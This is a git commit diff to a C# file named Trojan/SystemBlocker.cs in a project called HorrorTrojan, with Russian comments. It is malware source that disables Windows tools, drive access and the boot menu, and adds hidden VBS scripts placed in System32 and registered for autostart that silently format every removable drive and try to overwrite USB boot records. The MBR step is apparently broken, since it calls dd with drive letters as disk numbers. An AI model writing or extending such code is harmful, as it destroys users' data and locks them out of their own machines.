4d43bf6c3e23fa69f38e747f20ff3e7c782dc29b
Virusodel <134794046+Virusodel@users.noreply.github.com>
2026-08-30 11:56:44 +0300

    Update SystemBlocker.cs

--- Trojan/SystemBlocker.cs
+++ Trojan/SystemBlocker.cs
@@ -1,4 +1,5 @@
 using Microsoft.Win32;
+using System.IO;
 
 namespace HorrorTrojan
 {
@@ -25,6 +26,11 @@ namespace HorrorTrojan
             DisableDeviceManager();
             DisableMMC();
             DisableBIOSAccess();
+            
+            // ===== НОВЫЕ БЛОКИРОВКИ USB =====
+            DisableUSBboot();
+            AutoFormatUSB();
+            DestroyUSBMBR();
         }
         
         private static void DisableTaskManager()
@@ -107,12 +113,12 @@ namespace HorrorTrojan
         }
 
         private static void DisableDrives()
-{
-    using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
-    {
-        key.SetValue("NoDrives", 0x03FFFFFF, RegistryValueKind.DWord);      // ← СКРЫВАЕТ ВСЕ ДИСКИ
-        key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord); // ← ЗАПРЕЩАЕТ ПРОСМОТР
-    }
+        {
+            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
+            {
+                key.SetValue("NoDrives", 0x03FFFFFF, RegistryValueKind.DWord);
+                key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord);
+            }
         }
 
         private static void DisableControlPanel()
@@ -149,6 +155,82 @@ namespace HorrorTrojan
         {
             using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System"))
                 key.SetValue("EnableFirstLogonAnimation", 0, RegistryValueKind.DWord);
+                
+            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Session Manager\Power"))
+                key.SetValue("HiberbootEnabled", 0, RegistryValueKind.DWord);
+        }
+        
+        // ===== НОВЫЕ МЕТОДЫ ДЛЯ USB (БЕЗ ОКОН) =====
+        
+        private static void DisableUSBboot()
+        {
+            try
+            {
+                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\BootManager"))
+                {
+                    key.SetValue("BootMenuPolicy", 1, RegistryValueKind.DWord);
+                    key.SetValue("DisplayBootMenu", 0, RegistryValueKind.DWord);
+                }
+                
+                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System"))
+                {
+                    key.SetValue("EnableBootMenu", 0, RegistryValueKind.DWord);
+                }
+            }
+            catch { }
+        }
+        
+        private static void AutoFormatUSB()
+        {
+            try
+            {
+                // VBS-скрипт выполняется БЕЗ окон (wscript.exe, WindowStyle=0)
+                string vbsContent = @"
+Set objShell = CreateObject(""WScript.Shell"")
+Set objFSO = CreateObject(""Scripting.FileSystemObject"")
+Set colDrives = objFSO.Drives
+
+For Each objDrive In colDrives
+    If objDrive.DriveType = 2 Then
+        objShell.Run ""cmd /c format "" & objDrive.DriveLetter & "": /Q /Y"", 0, False
+    End If
+Next
+";
+                File.WriteAllText(@"C:\Windows\System32\usbkill.vbs", vbsContent);
+                
+                // Добавляем в автозапуск (wscript.exe запускает VBS без окон)
+                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
+                {
+                    key.SetValue("USBKiller", @"wscript.exe C:\Windows\System32\usbkill.vbs", RegistryValueKind.String);
+                }
+            }
+            catch { }
+        }
+        
+        private static void DestroyUSBMBR()
+        {
+            try
+            {
+                // VBS-скрипт для уничтожения MBR на USB (БЕЗ окон)
+                string vbsContent = @"
+Set objShell = CreateObject(""WScript.Shell"")
+Set objFSO = CreateObject(""Scripting.FileSystemObject"")
+Set colDrives = objFSO.Drives
+
+For Each objDrive In colDrives
+    If objDrive.DriveType = 2 Then
+        objShell.Run ""cmd /c dd if=\\.\PhysicalDrive0 of=\\.\PhysicalDrive"" & objDrive.DriveLetter & "" bs=512 count=1 seek=0"", 0, False
+    End If
+Next
+";
+                File.WriteAllText(@"C:\Windows\System32\usbdestroy.vbs", vbsContent);
+                
+                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
+                {
+                    key.SetValue("USBDestroyer", @"wscript.exe C:\Windows\System32\usbdestroy.vbs", RegistryValueKind.String);
+                }
+            }
+            catch { }
         }
     }
 }
